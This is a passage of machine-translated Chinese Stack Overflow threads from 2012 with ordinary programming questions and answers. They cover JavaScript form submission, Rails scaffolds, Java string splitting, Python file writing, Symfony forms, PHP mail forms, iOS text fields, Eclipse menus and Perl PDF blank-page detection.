        <option value="4" <?php if($_GET[price] == '4'){ echo 'selected="selected"'; }?>>< 4 euro</option>
        <option value="6" <?php if($_GET[price] == '6'){ echo 'selected="selected"'; }?>>< 6 euro</option>
        <option value="8" <?php if($_GET[price] == '8'){ echo 'selected="selected"'; }?>>< 8 euro</option>
        <option value="10" <?php if($_GET[price] == '10'){ echo 'selected="selected"'; }?>>< 10 euro</option>
    </select>
</form> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-12T15:02:55.040

您可以将它们保留为两个单独的表单，但为每个表单设置属性 id（当然，每个表单都有唯一的 id）并且 onchange 事件应该触发一个提交的函数。

```
<form action="" method="GET" id="firstF">
<select name="course" data-placeholder="Kies een vak..." class="chzn-select" tabindex="2" onchange="doSubmit('firstF')">
                                  <option value=""></option> 
                                  <option value="0">Alles</option> 
                                  <option value="1">Markten & Prijzen</option> 
                                  <option value="2">Wiskunde</option> 
                                  <option value="3">Marketing</option> 
</select>   
</form>

<form action="" method="GET" id="secondF">
<select name="price" data-placeholder="Prijscategorie..." class="chzn-select" tabindex="2" onchange="doSubmit('secondF')">
                                  <option value=""></option> 
                                  <option value="0">Alles</option> 
                                  <option value="2">< 2 euro</option> 
                                  <option value="4">< 4 euro</option> 
                                  <option value="6">< 6 euro</option> 
                                  <option value="8">< 8 euro</option> 
                                  <option value="10">< 10 euro</option> 
</select>   
</form> 
```

然后编写JavaScript函数如下：

```
 <script>
    function doSubmit(id){
    f = document.getElementById(id);
    f.submit();
    }

</script> 
```

以下为现场演示，[http://jsfiddle.net/JkrCu/](http://jsfiddle.net/JkrCu/)

**如果选择更改为空值，即列表中的初始项（空白项）** [http://jsfiddle.net/JkrCu/1/ ，这是更新的演示以停止提交](http://jsfiddle.net/JkrCu/1/)

# ruby-on-rails - 如何在铁轨中再生脚手架？

> ID：13841813
> 
> 赞同：0
> 
> 时间：2012-12-12T14:20:16.830
> 
> 标签：ruby-on-rails

我使用名为 Brick 的平面模型生成了一个脚手架，然后创建了 2 个名为混凝土和砂浆的新模型，并将 has_one 关系添加到 Brick。

现在我想重新生成脚手架，但出现此错误：

> 另一个迁移已命名为 create_brick_items：Construction/db/migrate/20121210193959_create_brick_items.rb

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T14:39:58.347

`rails generate migration AddMortarToBrick mortar:references` 或者任何砖块都有

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2019-10-20T14:31:25.707

你的问题如何再生脚手架。你需要：

1.  如果您已经运行迁移，则必须进行回滚`rake db:rollback`，或者如果您需要数据，则可以删除数据库，然后创建新数据库
2.  然后你可以像销毁生成的脚手架一样`rails destroy scaffold Brick`
3.  最后，您可以生成新的脚手架`rails generate scaffold Bricks name:string mortar:references`

# java - 在Java中将字符串逐字转换为数组

> ID：13841816
> 
> 赞同：0
> 
> 时间：2012-12-12T14:20:19.303
> 
> 标签：java, arrays, string

我有一些文字，例如：

```
DESC：方式 农奴制是如何在俄罗斯发展并离开俄罗斯的？
ENTY:cremat 哪些电影以大力水手道尔为主角？
DESC:manner 如何找到名人的真实姓名列表？

```

我逐行阅读它们，我想将每一行转换为一个`string Array`单词一个单词。像这样：

> Array = [DESC, :, 方式, How, did, serfdom ,develop, in ,and ,then ,leave, Russia ,?]

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-12T15:26:05.407

```
String[] arr = str.replaceAll(":"," : ").split(" "); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T14:39:04.547

对于您的示例：

```
String[] part = line.split(":| "); 
```

`line`您的示例行在哪里。

请注意，正则表达式中的`space`后面有一个。`|`

我建议阅读正则表达式并使用像 Expresso 这样的工具来试用它们。

快递：[http ://www.ultrapico.com/Expresso.htm](http://www.ultrapico.com/Expresso.htm)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-12T14:29:05.607

字符串值 = ""; String[] 值 = value.split(" ");

这应该让您将数组按空格作为分隔符。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-12T15:05:16.907

如果您不介意从结果中删除标点符号，`String#split("\\W")`（拆分为非单词字符）会这样做：

```
// you've got this from the input parser
String inputLine = "DESC:manner How did serfdom develop in and then leave Russia ?";

String[] wordArray = inputLine.split("\\W"); 
```

这给出了：

```
wordArray = [DESC, manner, How, did, serfdom, develop, in, and, then, leave, Russia] 
```

如果您需要标点符号，我认为正则表达式无法做到这一点，因为它通过破坏匹配的字符来进行拆分。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-12-12T19:31:21.000

您可以使用[Guava 的 Splitter](http://docs.guava-libraries.googlecode.com/git-history/v13.0.1/javadoc/com/google/common/base/Splitter.html)：

```
Iterable<String> wordsIterable = Splitter.on(Pattern.compile("\\b")).trimResults().omitEmptyStrings().split(string);
String[] words = Iterables.toArray(wordsIterable, String.class); 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-12-12T14:36:01.080

对于更全面的解决方案，您可以使用边界匹配器，如此处[所述](http://docs.oracle.com/javase/tutorial/essential/regex/bounds.html)

```
String s = "DESC:manner How did serfdom develop in and then leave Russia ?";

String[] split = s.split("\\b"); 
```

拆分数组包含您要查找的内容。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-12-12T14:37:31.203

你的意思是你想把你的字符串线分割成一个字符串数组。

有两种方便的方法可以做到这一点。

首先当然是拆分方法。你可以在 j2se String 类中引用这个方法。

第二个是正则表达式模式。你可以参考 j2se 正则表达式类中的信息

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2012-12-12T15:08:29.417

问题是您想保留一些分隔符而不是其他分隔符（保留`:`并松开空格）。我认为你需要一个正则表达式来完成这个。这样的事情应该这样做：

```
String str = "DESC:manner How did serfdom develop in and then leave Russia ?";
String arr[] = str.split("((?<=:)|(?=:))|( )"); 
```

这使用 Lookahead 和 Lookbehind RegEx 来查找/保留分隔符`:`，同时我们添加了一个正常的拆分空间`( )`来丢弃那些。

在此 arr 之后应该是：

```
arr = [DESC, :, manner, How, did, serfdom, develop, in, and, then, leave, Russia, ?] 
```

# iphone - 从当前位置获取天气预报详细信息

> ID：13841819
> 
> 赞同：-1
> 
> 时间：2012-12-12T14:23:05.287
> 
> 标签：iphone, weather-api

在我的应用程序中，我使用 google api 来获取天气详细信息，但我只知道它不再起作用。

雅虎天气 API 很好用，但根据其条款它不用于商业用途，所以我不能使用它。

任何人都可以提出任何建议或提供任何链接以使用其他天气 API。

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-13T04:53:48.653

您可以在此处获取[RSS 中的美国天气。](http://www.rssweather.com)对于英国，[BBC 也在 RSS 中提供这项服务](http://open.live.bbc.co.uk/weather/feeds/en/w2/3dayforecast.rss)——以邮政编码 W2 为例。这些也是公共领域。我可以找到其他国家/地区，只需发表评论说您想要哪个。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-17T06:36:29.673

这是两个提供天气预报的链接

[http://www.worldweatheronline.com/free-weather.aspx](http://www.worldweatheronline.com/free-weather.aspx)和 [http://www.wunderground.com/weather/api/](http://www.wunderground.com/weather/api/)

注意：在两者中，每天和每小时的请求数量也有限制

谢谢。

# python - 将输出重定向到python中的文件

> ID：13841821
> 
> 赞同：-1
> 
> 时间：2012-12-12T14:23:42.417
> 
> 标签：python

在 shell 脚本中，如果我们有类似的东西：

```
field1 = 22
qry="delete from table_name where id = $field1
echo $qry >> /tmp/query.ksh 
```

在我们的文件中

```
delete from table_name where id = 22 
```

我想在 python 中实现同样的目标

我应该如何在我正在做的python中实现这一点

```
fo = open("file","a")
fo.write(qry) 
```

但这不起作用。

请提出正确的方法。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T14:33:38.213

假设您要附加到名为`file`.

请注意，您应该关闭您打开的文件或（在最近的 Python 版本上）使用`with`语句。将你的 shell 代码翻译成 Python，

```
field1 = 22
qry = "delete from table_name where id = {}".format(field1)
with open('/tmp/query.ksh', 'a') as of:
    of.write(qry) 
```

请注意，在现实生活中，您不应该直接将数据插入到准备好的 SQL 语句中，因为这可能会导致 SQL 注入。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-12T14:33:23.037

像你已经拥有的东西应该可以正常工作。

```
 field1 = 22
   qry = "delete from table_name where id = {0}\n".format(field1)
   with open('your_file', 'a') as f:
     f.write(qry) 
```

什么具体不起作用？你所有的python代码在哪里？你只发布了 2 行你在哪里定义`qry`？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-12T14:49:51.423

您的代码正在运行，或者您可以通过执行以下操作将打印输出定向到文件：

```
import sys
sys.stdout = open("file","a")

field1 = 22
qry = "delete from table_name where id = {0}\n".format(field1)
print qry 
```

# propel - Symfony 和 Propel：生成动态表单

> ID：13841822
> 
> 赞同：1
> 
> 时间：2012-12-12T14:23:46.793
> 
> 标签：propel, symfony-2.1

我正在使用 Symfony-2.1 和 Propel 开发一个基本的 CRUD 应用程序。理想情况下，我的模型将在推进 XML 模式中定义，并且 GUI 将自动更新以反映更改。我认为在我给定的时间限制内这是不可能的，但我正在努力尽可能接近。

我的第一个折衷方案是手动创建表单类型，因为推进表单类型生成器相当简陋。但是为了保持手动采用的水平（例如在添加新模型类型时），我想完全通过自定义表单类型的定义来解决以下问题：

我有一个中等复杂的 Title 模型，它与 TitleFragment 模型（代表历史出版物的主标题、副标题和短标题）具有一对多的关系。在我编辑标题的 HTML 表单中，我实现了标准的“添加一个”行为以允许添加另一个 TitleFragment（如[symfony 食谱](http://symfony.com/doc/current/cookbook/form/form_collections.html)中所述）。

食谱解决方案为表单元素提出了一个列表结构，我添加了两个 JavaScript 指示器类来触发该表单元素上的 jQuery 控件元素生成代码：

```
<form [...]>
 <ol class="collection-editor collection-sortable" 
      data-prototype="{{ form_widget(form.titleFragments.vars.prototype)|e }}">
    {% for titleFragment in form.titleFragments %}
        <li>
        {{ form_widget(titleFragment) }}
        </li>
    {% endfor %}
  </ol>
  [...]
</form> 
```

我想通过对自定义表单类型使用 symfony 表单主题技术来自动生成该标记。为了实现这一点，我继承了 symfony 集合表单类型，只是更改了它的名称以使我的自定义表单主题适用于该表单：

```
class SortableCollectionType extends \Symfony\Component\Form\Extension\Core\Type\CollectionType {
    public function getName() {
        return 'sortableCollection'; 
    }
} 
```

现在，我必须通过 sortableCollection_widget 块来增加默认的 symfony 表单主题（form_div_layout.html.twig），以强制将我的集合呈现为列表并将一些 JavaScript 指示符类附加到列表（如代码示例 #1 中）。

问题在于，在模板中，form.titleFragments 依赖于模型（并且将始终依赖于模型，因为数据需要绑定到 Title 模型的 TitleFragments 的底层集合）。

```
class TitleType extends BaseAbstractType {

public function buildForm(FormBuilderInterface $builder, array $options) {

    $builder->add('titleFragments', // no choice for a generic name here

      new Form\DerivedType\SortableCollectionType(), array( 
        'type' => new TitlefragmentType(),
        'allow_add' => true,
        'by_reference' => false,
    ));
}
} 
```

我考虑过将属性的名称（例如“titleFragments”）传递给模板，因为从 1.2 版开始，twig 支持对对象属性的动态访问（使用属性函数）。

有人知道如何从我的自定义表单类型一直获取数据到树枝模板吗？没关系，尽管它当然是多余的并且有点笨拙。

```
 $builder->add('titleFragments', 
      new Form\DerivedType\SortableCollectionType(), array( 
        'type' => new TitlefragmentType(),
        'options' => array('collectionPropertyName' => 'titleFragments'), 
```

我没有发现[表单构建器](http://api.symfony.com/2.1/Symfony/Component/Form/FormBuilder.html#method_add)的 Symfony API特别有用。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-04T12:49:59.250

要将数据传递给视图，可以使用表单类型的 finishView 方法。

```
public function finishView(FormView $view, FormInterface $form, array $options){
        $view->vars['modelClass'] = $this->modelClass;
} 
```

由于 data_class 是在表单类型上定义的，我什至可以自动计算这个值。如果集合包含嵌套类型，我还会自动覆盖原型元素 id 占位符 (prototypeName)。

```
public function buildForm(FormBuilderInterface $builder, array $options)
{
    parent::buildForm($builder, $options);

    // extract unqualified class name and pass it to the view
    // this allows more accurate control elements (instead of "add component",
    // one can use "add modelClass")
    $dataClassStr = $options['type']->getOption('data_class');
    $parts = explode('\\', $dataClassStr);
    $this->modelClass = array_pop($parts);

    $prototypeName = '__' . $this->modelClass . 'ID__';

    if ($options['allow_add'] && $options['prototype']) {
        $prototype = $builder->create($prototypeName, $options['type'], array_replace(array(
            'label' => $options['prototype_name'] . 'label__',
        ), $options['options']));
        $builder->setAttribute('prototype', $prototype->getForm());
    }
} 
```

在 twig 模板中，传递给视图的数据可通过 form.vars 变量获得。

```
{% block sortableCollection_widget %}
{% spaceless %}

    {# [...] code copied from the default collection widget #}

    <a href="#" class="sortableCollectionWidget add-entity">
        {{ form.vars.modelClass|trans }} add one
    </a>

    {# For the javascript to have access to the translated modelClass name.
       The up and down sortable controls need this to be more expressive.   #}

    <input type="hidden" name="modelClassName" value="{{ form.vars.modelClass }}"/>

{% endspaceless %}
{% endblock %} 
```

# python - Chrome 不呈现由 Python/WebApp2 提供的样式表

> ID：13841827
> 
> 赞同：1
> 
> 时间：2012-12-12T14:24:19.920
> 
> 标签：python, css, google-chrome, internet-explorer-8, webapp2

我不知道我做错了什么。

我正在使用带有前端基本页面的 Twitter Bootstrap，并在后端使用 Python / WebApp2（不是 Google App Engine）提供所有服务。

如果我在 Internet Explorer 8 中从服务器加载页面，就会出现样式。

如果我在 Chrome 中从 C:/ 加载页面，则会出现样式。

如果我在 Chrome 中从服务器加载页面，则样式不会出现。

我检查了所有的 mime 类型，比较了 C:/ 和服务器页面，一切看起来都一样。

我一生都无法弄清楚为什么 Chrome 在 Python / WebApp2 提供服务时不呈现样式表。

我无法弄清楚如何在没有实际处理的情况下将代码放入此文本框中，因此我使用的页面与此处显示的示例基本相同：http: [//twitter.github.com/bootstrap/getting-开始.html](http://twitter.github.com/bootstrap/getting-started.html)

有任何想法吗？

用于 css 的 Python 脚本 ![http://i.stack.imgur.com/Tu4NX.png](../Images/e15e8134e8c3aaa7b4bdd63628207541.png)

Non Styled - 由 Python / Webapp2 服务，在 Chrome 中查看 ![http://i.stack.imgur.com/vfKIa.png](../Images/95d5f836a8f1c98555c933715575bfde.png)

Styled - 从 C 中提取，在 Chrome 中查看

![http://i.stack.imgur.com/35C4S.png](../Images/b81a6202989560ce52222a6d0a520722.png)

非样式化 - Chrome 资源选项卡 ![http://i.stack.imgur.com/HvQXt.png](../Images/5ee60389339ed13fd95486b23e6f4d3b.png)

样式化 - Chrome 资源选项卡 ![http://i.stack.imgur.com/Rel3r.png](../Images/362ec72fcdc1ebebe438e28861fe0794.png)

我可以在 Chrome 资源选项卡中提取 CSS 文件并查看 CSS 文件的内容。没有警告它在控制台中被解释为 text/xml。 ![http://i.stack.imgur.com/5gTUO.png](../Images/5db4433cb2e3c49fcb281e9361288ab9.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-02T17:15:56.930

GAAAH 我刚刚想通了！

在我的 python 代码中，你可以看到我正在使用'self.response.headers.add_header'。我猜每当你使用“self.response.out.write”函数时，默认情况下它都有一个“text/html”内容类型。如果你“添加标题”，那么它会在最终的“text/html”标题之前添加一个“text/css”标题。Chrome 然后读取最后一个标题并将其用作样式表的内容类型。我猜 IE 和 Opera 使用第一个？无论如何：修复，使用：

```
self.response.headers['Content-Type'] = "text/css" 
```

和作为一个整体

```
def css(self, css_dir, filename, extension):
    self.response.headers['Content-Type'] = "text/css"
    self.response.out.write(open(css_dir + filename + extension,"rb").read()) 
```

耶！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T15:29:16.647

我更喜欢[使用 webapp 模板](http://webapp-improved.appspot.com/tutorials/gettingstarted/templates.html)而不是代码的直接响应 HTML 输出。

只需创建 index.html

```
<html>
<head>
 <link rel="stylesheet" href="{{path_to_css}}" type="text/css" />
</head>
<!-- body.. --> 
```

然后你可以`path_to_css`从代码中设置。使用这种方法，您可以将 HTML、CSS 从代码逻辑中分离出来。

# php - 如何忽略重复名称并使用嵌套数组使首字母大写？

> ID：13841834
> 
> 赞同：0
> 
> 时间：2012-12-12T14:26:44.853
> 
> 标签：php

嗨朋友我正在使用嵌套数组来显示名称和语言。我想显示第一个字母名称应该大写并避免语言重复。这是我的代码。 **我的代码**

```
$user=array(array("name"=>"prusoth","language"=>array("english","tamil")),array("name"=>"ven kat","language"=>array("english","french")));

print_r($user);

print_r(array_unique($user));

print_r(ucfirst($user)); 
```

我想要这样的输出： name = (Prusoth,Venkat) language = (english,tamil,french)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T14:41:00.000

您需要将数组拆分为 2 个数组：键和值：

```
$names = array_keys($user);
$countries = array_values($user); 
```

大写名称数组的每个元素：

```
array_map('ucfirst', $names); 
```

独特的国家：

```
$countries = array_unique($countries); 
```

# uitextfield - UITextField在编辑时不调整字体大小

> ID：13841835
> 
> 赞同：2
> 
> 时间：2012-12-12T14:26:54.957
> 
> 标签：uitextfield

我正在使用设置了所有属性的文本字段，它在编辑时没有调整字体大小，并且文本超出了文本字段的视图

```
txtTitle.font = [UIFont fontWithName:@"Helvetica" size:15.0f];
[txtTitle setMinimumFontSize:3.0];
[txtTitle setAdjustsFontSizeToFitWidth:YES]; 
```

它在一定程度上调整大小，然后与超出视图文本字段的文本结果相同

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-15T08:55:16.583

我知道它是一个旧线程，但仍然以防你没有弄清楚。这是一个错误，以下可以用作解决方法。在 UITextField 上创建一个类别并编写以下方法，并在需要更改字体大小以适应文本字段的宽度时调用它。

```
- (void)adjustFontSizeToFit
{
UIFont *font = self.font;
CGSize size = self.frame.size;
for (CGFloat maxSize = self.font.pointSize; maxSize >= self.minimumFontSize; maxSize -= 1.f)
{
    font = [font fontWithSize:maxSize];
    CGSize constraintSize = CGSizeMake(size.width, MAXFLOAT);
    CGSize labelSize = [self.text sizeWithFont:font constrainedToSize:constraintSize lineBreakMode:UILineBreakModeWordWrap];
// Keeping the width constant if given text requires more height , decrease the font size.
    if(labelSize.height <= size.height)
    {
        self.font = font;
        [self setNeedsLayout];
        break;
    }
}
// set the font to the minimum size anyway
self.font = font;
[self setNeedsLayout];
} 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2015-02-14T19:53:28.420

谢谢你，安基特！这个对我有用。我不得不更新一个不推荐使用的方法：sizeWithFont

```
- (void)adjustFontSizeToFit {

    UIFont *font = self.font;
    CGSize size = self.frame.size;

    for (CGFloat maxSize = self.font.pointSize; maxSize >= self.minimumFontSize; maxSize -= 1.f) {

        font = [font fontWithSize:maxSize];
        //CGSize constraintSize = CGSizeMake(size.width, MAXFLOAT);
        //CGSize labelSize = [self.text sizeWithFont:font constrainedToSize:constraintSize lineBreakMode:UILineBreakModeWordWrap];

        NSAttributedString *attributedText =  [[NSAttributedString alloc] initWithString:self.text
     attributes:@ { NSFontAttributeName: font  }];

        CGRect rect = [attributedText boundingRectWithSize:(CGSize){size.width, CGFLOAT_MAX} options:NSStringDrawingUsesLineFragmentOrigin context:nil];

        CGSize labelSize = rect.size;

        // Keeping the width constant if given text requires more height , decrease the font size.
        if(labelSize.height <= size.height) {
            self.font = font;
            [self setNeedsLayout];
            break;
        }
     }
     // set the font to the minimum size anyway
     self.font = font;
     [self setNeedsLayout];
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-07-07T16:55:46.980

迅速回答：

```
extension UITextField {

func adjustFontSizeToFitHeight(minFontSize : CGFloat, maxFontSize : CGFloat) {
    guard let labelText: NSString = text else {
        return
    }

    guard let font: UIFont = self.font else {
        return
    }

    let labelHeight = frame.size.height

    guard labelHeight != 0 else {
        return
    }

    // replace with newton's method
    for size in minFontSize.stride(to: maxFontSize, by: 0.1) {

        let textHeight = labelText.sizeWithAttributes([NSFontAttributeName: font.fontWithSize(size)]).height

        if textHeight > labelHeight {
            self.font = font.fontWithSize(max(size - 0.1, minFontSize))
            return
        }
    }
    self.font = font.fontWithSize(maxFontSize)
}

} 
```

# java - 以编程方式将选项添加到 Eclipse 中的下拉按钮

> ID：13841838
> 
> 赞同：4
> 
> 时间：2012-12-12T14:27:56.327
> 
> 标签：java, eclipse, eclipse-plugin, eclipse-rcp

在 Eclipse 中，我为它们拥有的主按钮工具栏中的按钮定义了命令。我有一个设置为下拉按钮的命令/按钮，我想以编程方式为其添加选项。有点像在 Eclipse 中点击播放按钮上的小下拉按钮并查看不同的运行场景。我希望能够将这样的选项添加到我的下拉菜单中。我不能通过插件编辑器来完成，因为我需要动态生成菜单选项。

所以说我在我的 plugin.xml 文件中定义了以下下拉按钮。如何以编程方式向下拉菜单添加选项？

```
 <menuContribution
        allPopups="false"
        locationURI="toolbar:org.eclipse.ui.main.toolbar">
     <toolbar
           id="com.company.gui.base.toolBarMain">
        <command
              commandId="com.company.gui.base.command1"
              icon="icons/magnifier.png"
              id="com.company.gui.base.toolBarMain.monitor"
              label="Im a pulldown menu"
              style="pulldown">
        </command>
     </toolbar>
  </menuContribution> 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-12-13T06:15:11.833

请找到以下代码。

```
private void addContextMenu(SampleContributionFactory fac) {
     final IMenuService menuService = (IMenuService) PlatformUI.getWorkbench().getService (IMenuService.class);
     menuService.addContributionFactory(fac);
}

class SampleContributionFactory extends AbstractContributionFactory{

    SampleContributionFactory(final String menuID) {
        super("menu:" + menuID, null);
    }

    @Override
    public void createContributionItems(IServiceLocator serviceLocator,
            IContributionRoot additions) {      
        // add Command Contribution item
        additions.addContributionItem(<YOUR CONTRIBUTION ITEM>, null);
    // add one more Command Contribution item
    ....
    } 
} 
```

现在创建一个 SampleContributionFactory 对象，如下所示。

```
 SampleContributionFactory fac = new SampleContributionFactory ("com.company.gui.base.toolBarMain.monitor"); 
```

并调用方法

```
addContextMenu(fac); 
```

TODO ：根据您的要求在 SampleContributionFactory 中添加命令贡献项。

# javascript - 在谷歌浏览器中禁用位置栏

> ID：13841839
> 
> 赞同：3
> 
> 时间：2012-12-12T14:28:36.697
> 
> 标签：javascript, jquery, google-chrome, dom, window.open

我正在使用`window.open`jQuery 中的单击事件。问题是我想禁用位置栏，它在 Safari 中有效，但在 Chrome 中无效。我在某处听说无法摆脱 Chrome 中的位置栏，这是真的吗？

**这是代码：**

```
var features = "left=200,toolbar=0,resizable=0,scrollbars=0,location=0,menubar=0,status=0,width=510,height=547";
window.open(URL, NAME, features); 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-12T14:45:08.430

您无法在 chrome 中摆脱它，但`location=0`会使其至少无法编辑。它仍然会出现，但他们无法更改位置。但是，除此之外，您无能为力。

# ios - iOS 中的 PowerPoint (pptx)

> ID：13841844
> 
> 赞同：1
> 
> 时间：2012-12-12T14:28:57.173
> 
> 标签：ios, html, uiwebview, powerpoint

我正在尝试在 iOS 本机应用程序中嵌入包含视频和动画的 pptx 演示文稿。

`UIWebView`- 它呈现它，您可以滚动幻灯片，但与幻灯片没有实际交互（例如：单击将您发送到某个滑块的按钮等）。

我尝试使用 powerpoint2003 将 pptx 转换为 HTML 格式（mht 和普通 html 格式 - 两者都失败了）（以后的版本不再支持转换为 html 格式）。

不得不提的是，它是一个带有许多幻灯片的单一 powerpoint 演示文稿，因此该应用程序将是静态的，仅包含演示文稿，内容不会改变。

我不知道下一步该尝试什么。我正在考虑转换为 HTML5（如果有任何方法可以将 pptx 转换为 html5）。我没有任何想法 - 除了从头开始制作一个模拟 pptx 外观和工作方式的本机应用程序。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-09-03T10:32:51.867

转换为 HTML5 然后嵌入 UIWebView 就是答案。保持互动是困难的。但是您不必重新发明轮子，一个名为 SlideGo 的工具是免费的。如果您需要构建自己的导航，它还会公开一些 javascript API，否则只需使用默认滑动来推进幻灯片。

# php - 从提交的表单接收电子邮件中的复选框信息

> ID：13841846
> 
> 赞同：1
> 
> 时间：2012-12-12T14:28:59.663
> 
> 标签：php, html, email, contact-form

我已经实现了一个表单，可以成功地将提交的信息发送到我的电子邮件中。我可以通过除复选框之外的所有输入来实现这一点。我必须做什么才能使复选框值也出现在我的电子邮件中？我尝试为每个循环使用一个，但我不知道我是否沿着正确的路线。相关代码如下：

代码：

```
$companyname = $_POST['companyname'];
$fullname = $_POST['fullname'];
$email = $_POST['email'];
$phonenumber = $_POST['phonenumber'];

foreach($_POST['check'] as $value) {
$check_msg .= "Checked: $value\n";
}

$to = 'woodsy0130@hotmail.com';
$subject = 'Quote';
$message = 'Company Name: '.$companyname. "\n"."\n". 'Full Name: ' .$fullname.     "\n"."\n". 'E-mail: '.$email. "\n"."\n". 'Phone Number: '.$phonenumber. "\n"."\n". 'Features: '$check_msg; 
```

HTML：

```
<label><input type="checkbox" name="check[]" id="q12_1" value="E commerce  Shopping Cart" />E-commerce (Shopping Cart)</label>
<label><input type="checkbox" name="check[]" id="q12_2" value="Content Management System  CMS"   />Content Management System (CMS)</label> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-12T14:43:51.193

尝试：

`$message = 'Company Name: '.$companyname. "\n"."\n". 'Full Name: ' .$fullname. "\n"."\n". 'E-mail: '.$email. "\n"."\n". 'Phone Number: '.$phonenumber. "\n"."\n". 'Features: '.$check_msg;`

你错过了`.`之后`'Features: '`

例如，这有效：

```
<?php

$companyname = $_POST['companyname'];
$fullname = $_POST['fullname'];
$email = $_POST['email'];
$phonenumber = $_POST['phonenumber'];

foreach ($_POST['check'] as $value) {
    $check_msg .= "Checked: $value\n";
}

$to = 'woodsy0130@hotmail.com';
$subject = 'Quote';
$message = 'Company Name: '.$companyname. "\n"."\n". 'Full Name: ' .$fullname.     "\n"."\n". 'E-mail: '.$email. "\n"."\n". 'Phone Number: '.$phonenumber. "\n"."\n". 'Features: '.$check_msg;
echo $message;
?>
<form action='' method="post">
    <label>
        <input type="checkbox" name="check[]" id="q12_1" value="E commerce  Shopping Cart" />
        E-commerce (Shopping Cart)</label>
    <label>
        <input type="checkbox" name="check[]" id="q12_2" value="Content Management System  CMS"   />
        Content Management System (CMS)</label>
    <input type="submit" value="submit">
</form> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-12T14:43:39.350

像这样试试。

```
if(!empty($_POST['check'])) {
    foreach($_POST['check'] as $value) {
        $check_msg .= "Checked:".$value."\n";            
    }} 
```

# ios - appcelerator 钛合金中的自定义表格视图

> ID：13841852
> 
> 赞同：0
> 
> 时间：2012-12-12T14:29:13.157
> 
> 标签：ios, titanium, tableview, appcelerator, titanium-mobile

我正在`tableView`开发 Titanium 中的应用程序。我需要在两个部分中显示数据。在**第 1 节**中我想显示单元格分隔符，在**第 2 节**中我不想要任何单元格分隔符。

我可以使用 tableview 的分隔符样式属性来删除分隔符样式，例如：

```
separatorStyle: Titanium.UI.iPhone.TableViewSeparatorStyle.NONE, 
```

但我的问题是它会从整个 tableView 中删除单元格分隔符。但我不希望这样，我需要第 1 节中的分隔符。

tableView 类似于：

![表视图](../Images/2ee3e98ce5e76d8b52780a8043486b3f.png)

**这有可能实现吗？或者我需要使用单个 Row 自定义第二部分并为其添加单独的标签？**

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-13T12:40:55.413

在 Titanium Appcelerator 的 TableViewRow 文档（http://docs.appcelerator.com/titanium/3.0/#!/api/Titanium.UI.TableViewRow-property-selectionStyle）中，您没有属性**separatorStyle**，因为它是表视图。

尝试手动制作行分隔符（在第一部分）：

```
 tableViewRow.add( Ti.UI.createView({
            height: 1,
            width: Ti.UI.FILL,
            backgroundColor: "#000000",
            bottom: 0
    }) ); 
```

# perl - 使用 perl 检测并删除 PDF 文件中的空白页

> ID：13841856
> 
> 赞同：3
> 
> 时间：2012-12-12T14:29:21.953
> 
> 标签：perl, pdf

有没有一种可靠的方法可以用 perl 脚本检测空白页？我尝试使用 getPageText 方法来执行以下脚本。如果我这样做，只包含没有文本的图形的页面也会被识别为空白页面。

```
#!/usr/bin/perl -w

use CAM::PDF;
my $filename=$ARGV[0];
my $doc = CAM::PDF->new($filename) || die "$CAM::PDF::errstr\n";
my $pages = $doc->numPages();
print $pages;

$content=$doc->getPageText(1);
print "length".length($content);
if(length($content)==0)
{
  print "File is empty";
}

foreach my $p ( 1 .. $doc->numPages() ) {
    my $str = $doc->getPageText($p);
    $str =~ m/[[:alnum:]]+/ms );  # actually returned text
    print "Result text:".qq($str);
 } 
```

还有另一种查找空白页的方法吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-12T14:34:37.133

抱歉，没有办法可靠地检测空白页。

但是，我过去是这样做的：

我使用 pdftk 将 pdf 拆分为一页 pdf 文档。如果其中一个 pdf 的大小非常小，则它不包含图像。如果 pdftotext 返回空字符串，则它不包含文本。使用 pdftk 将所有好的 pdf 组合成一个。

我希望它会帮助你。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T20:16:22.340

如果使用 getPageContentTree 方法而不是 getPageText，则可以获得包含页面上所有对象（包括图像）的内容流。检查“内容”哈希键的值的长度，如果等于 0，那么您就得到了一个真正的空白页。

```
use CAM::PDF;
my $filename="testBook.pdf";
my $doc = CAM::PDF->new($filename) || die "$CAM::PDF::errstr\n";
my $pages = $doc->numPages();

my $i = 1;

while ($i <= $pages) {
    my $contentTree = $doc->getPageContentTree($i);

    my $content = $contentTree->{"content"};
    my $length = length($content);

    if ($length == 0) {
        print "page $i is blank!" ## delete it, log it to a list of blanks, etc.
    }
    $i++;
} 
```

# javascript - 从项目列表中删除特定项目

> ID：13841858
> 
> 赞同：0
> 
> 时间：2012-12-12T14:29:27.837
> 
> 标签：javascript, jquery

我正在尝试删除 ID 列表中存在的特定 ID，这是 ID 和列表的代码

```
